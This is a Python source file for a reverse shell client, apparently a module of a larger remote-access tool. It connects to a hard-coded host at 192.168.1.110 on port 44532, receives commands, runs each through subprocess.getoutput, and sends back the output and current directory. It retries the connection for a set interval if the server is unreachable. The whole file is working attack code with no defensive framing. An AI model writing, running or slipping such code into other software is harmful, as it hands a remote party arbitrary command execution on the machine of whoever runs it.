import socket
import os
import subprocess
import time

#todo
# update module options in config file to get host address and port
# close the client before system reload
SYSTEMRELOADINTERVAL = 40
SERVER_HOST = "192.168.1.110"
SERVER_PORT = 44532 
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"
START_TIME = time.time()

def start_remote_client():
    s = socket.socket()
    try:
        s.connect((SERVER_HOST, SERVER_PORT))
    except socket.error as e:
        return -1
    cwd = os.getcwd()
    s.send(cwd.encode())
    while True:
        s.settimeout(SYSTEMRELOADINTERVAL)
        command = s.recv(BUFFER_SIZE).decode()
        splited_command = command.split()
        if command.lower() == "exit":
            break
        if splited_command[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                output = str(e)
            else:
                output = "directory changed"
        else:
            output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}{SEPARATOR}{cwd}"
        s.send(message.encode())

    s.close()
    return 1

def run(file_name="", interval=4600):
    global START_TIME
    START_TIME = time.time()
    server_found = start_remote_client()
    while server_found == -1 and time.time() - START_TIME < SYSTEMRELOADINTERVAL:
        time.sleep(3)
        server_found = start_remote_client()
    return ""

if __name__ == "__main__":
    run()
